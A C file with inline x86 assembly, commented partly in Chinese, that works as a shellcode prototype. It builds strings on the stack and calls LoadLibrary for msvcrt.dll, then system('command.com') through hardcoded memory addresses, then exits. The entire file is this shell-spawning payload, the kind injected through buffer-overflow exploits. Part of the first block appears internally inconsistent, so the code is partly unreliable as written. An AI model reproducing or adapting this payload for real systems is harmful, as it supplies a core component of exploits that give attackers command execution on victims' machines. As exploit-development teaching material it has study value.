#include <windows.h>
#include <winbase.h>

void main()
{

       __asm {
/*LoadLibrary("msvcrt.dll");*/
			      push ebp
                  mov ebp,esp
                  xor eax,eax
                  push eax
                  push eax

                  push eax
                  mov byte ptr[ebp-0Ch],4Dh
                  mov byte ptr[ebp-0Bh],53h
                  mov byte ptr[ebp-0Ah],56h
                  mov byte ptr[ebp-09h],43h
                  mov byte ptr[ebp-08h],52h
                  mov byte ptr[ebp-07h],54h
                  mov byte ptr[ebp-06h],2Eh
                  mov byte ptr[ebp-05h],44h
                  mov byte ptr[ebp-04h],4Ch
                  mov byte ptr[ebp-03h],4Ch
                  mov edx,0x77E5D961    //LoadLibrary
                  push edx
                  lea eax,[ebp-0Ch]
                  push eax
                  call dword ptr[ebp-10h]

				/* system("command.com") */
			   mov esp,ebp                 ;把ebp的内容赋值给esp
               push ebp                    ;保存ebp，esp－4
               mov ebp,esp                 ;给ebp赋新值，将作为局部变量的基指针
               xor edi,edi                 ;
               push edi                    ;压入0，esp－4，
                                           ;作用是构造字符串的结尾\0字符。
               sub esp,08h                 ;加上上面，一共有12个字节，
                                           ;用来放"command.com"。
               mov byte ptr [ebp-0ch],63h  ;
               mov byte ptr [ebp-0bh],6fh  ;
               mov byte ptr [ebp-0ah],6dh  ;
               mov byte ptr [ebp-09h],6Dh  ;
               mov byte ptr [ebp-08h],61h  ;
               mov byte ptr [ebp-07h],6eh  ;
               mov byte ptr [ebp-06h],64h  ;
               mov byte ptr [ebp-05h],2Eh  ;
               mov byte ptr [ebp-04h],63h  ;
               mov byte ptr [ebp-03h],6fh  ;
               mov byte ptr [ebp-02h],6dh  ;生成串"command.com".
               lea eax,[ebp-0ch]           ;
               push eax                    ;串地址作为参数入栈
               mov eax, 0x77bf8044         ;
               call eax                    ;调用system
				
				/* exit */
				  push ebp
                  mov ebp,esp
                  mov edx,0x77c07adc
                  push edx
                  xor eax,eax
                  push eax
                  call dword ptr[ebp-04h]

       }
}